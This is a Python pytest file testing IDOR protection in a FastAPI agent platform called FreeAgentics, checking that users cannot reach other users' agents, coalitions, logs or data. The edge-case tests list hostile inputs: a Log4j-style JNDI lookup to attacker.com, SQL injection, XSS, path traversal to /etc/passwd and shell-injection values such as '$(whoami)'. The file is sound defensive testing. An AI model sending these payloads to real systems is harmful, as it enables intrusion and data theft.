"""Integration tests for IDOR vulnerability protection.

This module tests IDOR protection across the entire FreeAgentics system,
ensuring comprehensive coverage of all resource types and access patterns.
"""

import json
import uuid
from typing import Dict

import pytest
from fastapi import status
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from api.main import app
from auth.security_implementation import UserRole, create_access_token
from database.models import Agent, AgentStatus, Coalition, CoalitionStatus


class TestIDORSystemIntegration:
    """Integration tests for system-wide IDOR protection."""

    @pytest.fixture(autouse=True)
    def setup(self, db: Session):
        """Set up comprehensive test environment."""
        self.client = TestClient(app)
        self.db = db

        # Create test users with different roles
        self.users = self._create_test_users()

        # Create test resources
        self.resources = self._create_test_resources(db)

        # Create relationships between resources
        self._create_resource_relationships(db)

    def _create_test_users(self) -> Dict[str, Dict]:
        """Create test users with various roles and permissions."""
        users = {}

        roles = [
            ("admin", UserRole.ADMIN),
            ("researcher1", UserRole.RESEARCHER),
            ("researcher2", UserRole.RESEARCHER),
            ("agent_manager1", UserRole.AGENT_MANAGER),
            ("agent_manager2", UserRole.AGENT_MANAGER),
            ("observer1", UserRole.OBSERVER),
            ("observer2", UserRole.OBSERVER),
        ]

        for username, role in roles:
            user_id = str(uuid.uuid4())
            user_data = {
                "user_id": user_id,
                "username": username,
                "email": f"{username}@test.com",
                "role": role,
            }

            token = create_access_token(data=user_data)

            users[username] = {
                "id": user_id,
                "data": user_data,
                "token": token,
                "headers": {"Authorization": f"Bearer {token}"},
                "role": role,
            }

        return users

    def _create_test_resources(self, db: Session) -> Dict[str, Dict]:
        """Create various test resources owned by different users."""
        resources = {
            "agents": {},
            "coalitions": {},
            "knowledge_nodes": {},
        }

        # Create agents for each user
        for username, user_info in self.users.items():
            if user_info["role"] in [
                UserRole.RESEARCHER,
                UserRole.AGENT_MANAGER,
            ]:
                agent = Agent(
                    id=uuid.uuid4(),
                    name=f"{username}_agent",
                    template="test-template",
                    status=AgentStatus.ACTIVE,
                    parameters={
                        "owner_id": user_info["id"],
                        "created_by": username,
                    },
                )
                db.add(agent)
                resources["agents"][str(agent.id)] = {
                    "owner": user_info["id"],
                    "username": username,
                }

        # Create coalitions
        coalition1 = Coalition(
            id=uuid.uuid4(),
            name="Research Coalition",
            purpose="Collaborative research",
            status=CoalitionStatus.ACTIVE,
            leader_id=self.users["researcher1"]["id"],
        )
        db.add(coalition1)
        resources["coalitions"][str(coalition1.id)] = {
            "leader": self.users["researcher1"]["id"],
            "members": [
                self.users["researcher1"]["id"],
                self.users["researcher2"]["id"],
            ],
        }

        coalition2 = Coalition(
            id=uuid.uuid4(),
            name="Agent Management Coalition",
            purpose="Agent coordination",
            status=CoalitionStatus.ACTIVE,
            leader_id=self.users["agent_manager1"]["id"],
        )
        db.add(coalition2)
        resources["coalitions"][str(coalition2.id)] = {
            "leader": self.users["agent_manager1"]["id"],
            "members": [
                self.users["agent_manager1"]["id"],
                self.users["agent_manager2"]["id"],
            ],
        }

        db.commit()
        return resources

    def _create_resource_relationships(self, db: Session):
        """Create relationships between resources for testing indirect references."""
        # This would create more complex relationships if needed

    def test_cross_user_agent_access(self):
        """Test that users cannot access each other's agents."""
        # Researcher1 tries to access Researcher2's agents
        researcher1_headers = self.users["researcher1"]["headers"]

        for agent_id, agent_info in self.resources["agents"].items():
            if agent_info["username"] != "researcher1":
                response = self.client.get(
                    f"/api/v1/agents/{agent_id}", headers=researcher1_headers
                )

                # Should be forbidden or not found
                assert response.status_code in [
                    status.HTTP_403_FORBIDDEN,
                    status.HTTP_404_NOT_FOUND,
                ], f"Researcher1 accessed {agent_info['username']}'s agent"

    def test_role_based_access_limitations(self):
        """Test that role-based access control prevents IDOR."""
        # Observer tries to modify resources
        observer_headers = self.users["observer1"]["headers"]

        for agent_id in self.resources["agents"]:
            # Try to update
            response = self.client.patch(
                f"/api/v1/agents/{agent_id}/status",
                headers=observer_headers,
                json={"status": "stopped"},
            )
            assert response.status_code == status.HTTP_403_FORBIDDEN

            # Try to delete
            response = self.client.delete(f"/api/v1/agents/{agent_id}", headers=observer_headers)
            assert response.status_code == status.HTTP_403_FORBIDDEN

    def test_coalition_membership_idor(self):
        """Test IDOR protection for coalition membership."""
        # Agent Manager 1 tries to access Research Coalition
        am1_headers = self.users["agent_manager1"]["headers"]

        research_coalition_id = None
        for coalition_id, coalition_info in self.resources["coalitions"].items():
            if coalition_info["leader"] == self.users["researcher1"]["id"]:
                research_coalition_id = coalition_id
                break

        if research_coalition_id:
            # Try to view members
            response = self.client.get(
                f"/api/v1/coalitions/{research_coalition_id}/members",
                headers=am1_headers,
            )

            # Should not expose members of coalition they don't belong to
            if response.status_code == status.HTTP_200_OK:
                members = response.json()
                assert self.users["agent_manager1"]["id"] not in [m.get("id") for m in members]

    def test_knowledge_graph_idor(self):
        """Test IDOR protection for knowledge graph resources."""
        researcher1_headers = self.users["researcher1"]["headers"]
        researcher2_headers = self.users["researcher2"]["headers"]

        # Create knowledge nodes
        response = self.client.post(
            "/api/v1/knowledge/nodes",
            headers=researcher1_headers,
            json={
                "type": "concept",
                "label": "Private Research",
                "properties": {"confidential": True},
            },
        )

        if response.status_code == status.HTTP_201_CREATED:
            node_id = response.json()["id"]

            # Researcher2 tries to access
            response = self.client.get(
                f"/api/v1/knowledge/nodes/{node_id}",
                headers=researcher2_headers,
            )

            # Should not access private knowledge
            assert response.status_code in [
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND,
            ]

    def test_api_key_based_idor(self):
        """Test IDOR protection when using API keys instead of JWT."""
        # Create API key authentication headers
        api_key_headers = {
            "X-API-Key": "test-api-key-12345",
            "X-User-ID": self.users["researcher2"]["id"],  # Try to impersonate
        }

        # Try to access resources
        for agent_id in self.resources["agents"]:
            response = self.client.get(f"/api/v1/agents/{agent_id}", headers=api_key_headers)

            # Should not authenticate with fake API key
            assert response.status_code == status.HTTP_401_UNAUTHORIZED

    def test_websocket_subscription_idor(self):
        """Test IDOR in WebSocket subscriptions."""
        import asyncio

        import websockets

        async def test_subscription():
            researcher1_token = self.users["researcher1"]["token"]

            # Try to subscribe to another user's agent updates
            for agent_id, agent_info in self.resources["agents"].items():
                if agent_info["username"] != "researcher1":
                    try:
                        async with websockets.connect(
                            f"ws://localhost:8000/ws?token={researcher1_token}"
                        ) as websocket:
                            # Try to subscribe to unauthorized agent
                            await websocket.send(
                                json.dumps(
                                    {
                                        "action": "subscribe",
                                        "resource": "agent",
                                        "id": agent_id,
                                    }
                                )
                            )

                            response = await websocket.recv()
                            data = json.loads(response)

                            # Should be rejected
                            assert data.get("status") != "subscribed"
                    except Exception:
                        # WebSocket might not be available
                        pass

        # Run async test
        asyncio.run(test_subscription())

    def test_batch_operations_mixed_ownership(self):
        """Test IDOR in batch operations with mixed ownership."""
        researcher1_headers = self.users["researcher1"]["headers"]

        # Collect all agent IDs (owned and not owned)
        owned_agents = []
        other_agents = []

        for agent_id, agent_info in self.resources["agents"].items():
            if agent_info["username"] == "researcher1":
                owned_agents.append(agent_id)
            else:
                other_agents.append(agent_id)

        # Try batch operation mixing owned and unowned
        if owned_agents and other_agents:
            batch_payload = {
                "agent_ids": owned_agents[:1] + other_agents[:1],
                "operation": "update_status",
                "data": {"status": "paused"},
            }

            response = self.client.post(
                "/api/v1/agents/batch",
                headers=researcher1_headers,
                json=batch_payload,
            )

            if response.status_code == status.HTTP_200_OK:
                result = response.json()
                # Should only affect owned agents
                assert result.get("updated_count", 0) <= len(owned_agents)

    def test_export_import_idor(self):
        """Test IDOR in export/import operations."""
        admin_headers = self.users["admin"]["headers"]
        researcher1_headers = self.users["researcher1"]["headers"]

        # Admin exports all agents
        response = self.client.get("/api/v1/export/agents", headers=admin_headers)

        if response.status_code == status.HTTP_200_OK:
            export_data = response.json()

            # Researcher1 tries to import all agents
            response = self.client.post(
                "/api/v1/import/agents",
                headers=researcher1_headers,
                json=export_data,
            )

            # Should not allow importing other users' agents
            if response.status_code == status.HTTP_200_OK:
                result = response.json()
                result.get("imported_count", 0)

                # Verify no unauthorized imports
                for agent_data in export_data.get("agents", []):
                    if agent_data.get("owner_id") != self.users["researcher1"]["id"]:
                        check_response = self.client.get(
                            f"/api/v1/agents/{agent_data['id']}",
                            headers=researcher1_headers,
                        )
                        assert check_response.status_code != status.HTTP_200_OK

    def test_search_and_filter_idor(self):
        """Test IDOR through search and filter operations."""
        researcher1_headers = self.users["researcher1"]["headers"]

        # Try various search/filter attempts
        search_params = [
            {"search": "*"},  # Wildcard
            {"filter": "owner_id:*"},  # All owners
            {"filter": f"owner_id:{self.users['researcher2']['id']}"},  # Specific user
            {"query": "SELECT * FROM agents"},  # SQL injection attempt
            {"filter": "' OR '1'='1"},  # SQL injection in filter
        ]

        for params in search_params:
            response = self.client.get(
                "/api/v1/agents/search",
                headers=researcher1_headers,
                params=params,
            )

            if response.status_code == status.HTTP_200_OK:
                results = response.json()

                # Should only return authorized results
                for result in results:
                    agent_id = result.get("id")
                    if agent_id in self.resources["agents"]:
                        assert (
                            self.resources["agents"][agent_id]["owner"]
                            == self.users["researcher1"]["id"]
                        )

    def test_metrics_and_analytics_idor(self):
        """Test IDOR in metrics and analytics endpoints."""
        observer_headers = self.users["observer1"]["headers"]

        # Observers can view metrics but should only see authorized data
        response = self.client.get("/api/v1/metrics/agents", headers=observer_headers)

        if response.status_code == status.HTTP_200_OK:
            metrics = response.json()

            # Should not expose individual agent details
            assert "agent_details" not in metrics
            assert "owner_breakdown" not in metrics

            # Should only show aggregate data
            assert "total_agents" in metrics
            assert "average_performance" in metrics

    def test_audit_log_idor(self):
        """Test IDOR in audit log access."""
        researcher1_headers = self.users["researcher1"]["headers"]

        # Try to access audit logs
        response = self.client.get(
            "/api/v1/audit/logs",
            headers=researcher1_headers,
            params={"user_id": self.users["researcher2"]["id"]},
        )

        # Should not access other users' audit logs
        if response.status_code == status.HTTP_200_OK:
            logs = response.json()
            for log in logs:
                assert log.get("user_id") == self.users["researcher1"]["id"]

    def test_notification_subscription_idor(self):
        """Test IDOR in notification subscriptions."""
        researcher1_headers = self.users["researcher1"]["headers"]

        # Try to subscribe to notifications for other users' resources
        for agent_id, agent_info in self.resources["agents"].items():
            if agent_info["username"] != "researcher1":
                response = self.client.post(
                    "/api/v1/notifications/subscribe",
                    headers=researcher1_headers,
                    json={
                        "resource_type": "agent",
                        "resource_id": agent_id,
                        "events": ["status_change", "error"],
                    },
                )

                # Should not allow subscription to unauthorized resources
                assert response.status_code in [
                    status.HTTP_403_FORBIDDEN,
                    status.HTTP_404_NOT_FOUND,
                ]


class TestIDOREdgeCases:
    """Test edge cases and complex IDOR scenarios."""

    @pytest.fixture
    def client(self):
        return TestClient(app)

    def test_null_and_undefined_ids(self, client):
        """Test IDOR with null, undefined, and special IDs."""
        token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "test_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {token}"}

        # Test various invalid IDs
        invalid_ids = [
            "null",
            "undefined",
            "None",
            "0",
            "-1",
            "",
            " ",
            "NaN",
            "Infinity",
            "true",
            "false",
            "../../etc/passwd",
            "${jndi:ldap://attacker.com/a}",  # Log4j style
            "{{7*7}}",  # Template injection
            "<script>alert(1)</script>",  # XSS attempt
        ]

        for invalid_id in invalid_ids:
            response = client.get(f"/api/v1/agents/{invalid_id}", headers=headers)
            # Should handle gracefully
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_404_NOT_FOUND,
            ]

            # Should not leak information
            if response.status_code == status.HTTP_400_BAD_REQUEST:
                error = response.json()
                assert "invalid" in error.get("detail", "").lower()

    def test_unicode_and_encoding_idor(self, client):
        """Test IDOR with Unicode and various encodings."""
        token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "test_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {token}"}

        # Test Unicode and encoded IDs
        encoded_ids = [
            "ะางเ☎️",  # Unicode
            "%00",  # Null byte
            "%0a",  # Newline
            "%0d%0a",  # CRLF
            "\x00admin",  # Null byte prefix
            "admin\x00",  # Null byte suffix
            "%c0%ae%c0%ae",  # Overlong encoding
            "＜script＞alert(1)＜/script＞",  # Full-width characters
        ]

        for encoded_id in encoded_ids:
            response = client.get(f"/api/v1/agents/{encoded_id}", headers=headers)
            assert response.status_code != status.HTTP_200_OK

    def test_extremely_long_ids(self, client):
        """Test IDOR with extremely long IDs."""
        token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "test_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {token}"}

        # Test various long IDs
        long_ids = [
            "a" * 1000,  # 1K characters
            "a" * 10000,  # 10K characters
            str(uuid.uuid4()) * 100,  # Repeated UUIDs
            "0" * 65536,  # 64K zeros
        ]

        for long_id in long_ids:
            response = client.get(f"/api/v1/agents/{long_id}", headers=headers)
            # Should reject or handle gracefully
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_414_URI_TOO_LONG,
                status.HTTP_404_NOT_FOUND,
            ]

    def test_special_character_ids(self, client):
        """Test IDOR with special characters in IDs."""
        token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "test_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {token}"}

        # Test special characters
        special_ids = [
            "';DROP TABLE agents;--",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "1=1",
            "' OR '1'='1",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "`id`",
            "$(whoami)",
            "|ls -la",
            ";cat /etc/passwd",
        ]

        for special_id in special_ids:
            response = client.get(f"/api/v1/agents/{special_id}", headers=headers)
            assert response.status_code != status.HTTP_200_OK

            # Ensure no command execution or injection
            if response.text:
                assert "/etc/passwd" not in response.text
                assert "DROP TABLE" not in response.text


class TestIDORCompliance:
    """Test IDOR protection compliance with security standards."""

    def test_owasp_top10_compliance(self, client):
        """Test compliance with OWASP Top 10 IDOR guidelines."""
        # This test verifies key OWASP recommendations
        token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "compliance_user",
                "role": UserRole.RESEARCHER,
            }
        )
        headers = {"Authorization": f"Bearer {token}"}

        # 1. Verify unpredictable IDs are used
        responses = []
        for i in range(5):
            response = client.post(
                "/api/v1/agents",
                headers=headers,
                json={"name": f"compliance_test_{i}", "template": "basic"},
            )
            if response.status_code == status.HTTP_201_CREATED:
                responses.append(response.json()["id"])

        # IDs should be UUIDs, not sequential
        for resource_id in responses:
            assert uuid.UUID(resource_id)

        # 2. Verify authorization is checked for each request
        fake_id = str(uuid.uuid4())
        response = client.get(f"/api/v1/agents/{fake_id}", headers=headers)
        assert response.status_code == status.HTTP_404_NOT_FOUND

        # 3. Verify consistent error messages
        response1 = client.get(f"/api/v1/agents/{fake_id}", headers=headers)
        response2 = client.get("/api/v1/agents/invalid-id", headers=headers)

        # Error messages should not reveal whether resource exists
        if response1.status_code == response2.status_code:
            assert response1.json().get("detail") == response2.json().get("detail")

    def test_gdpr_compliance_idor(self, client):
        """Test IDOR protection for GDPR compliance."""
        # Create users
        user1_token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "gdpr_user1",
                "role": UserRole.RESEARCHER,
            }
        )
        user2_token = create_access_token(
            data={
                "user_id": str(uuid.uuid4()),
                "username": "gdpr_user2",
                "role": UserRole.RESEARCHER,
            }
        )

        user1_headers = {"Authorization": f"Bearer {user1_token}"}
        user2_headers = {"Authorization": f"Bearer {user2_token}"}

        # User should only access their own personal data
        response = client.get("/api/v1/users/me/data", headers=user1_headers)
        if response.status_code == status.HTTP_200_OK:
            user1_data = response.json()

            # User2 should not access User1's personal data
            response = client.get(
                f"/api/v1/users/{user1_data.get('user_id')}/data",
                headers=user2_headers,
            )
            assert response.status_code in [
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND,
            ]


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
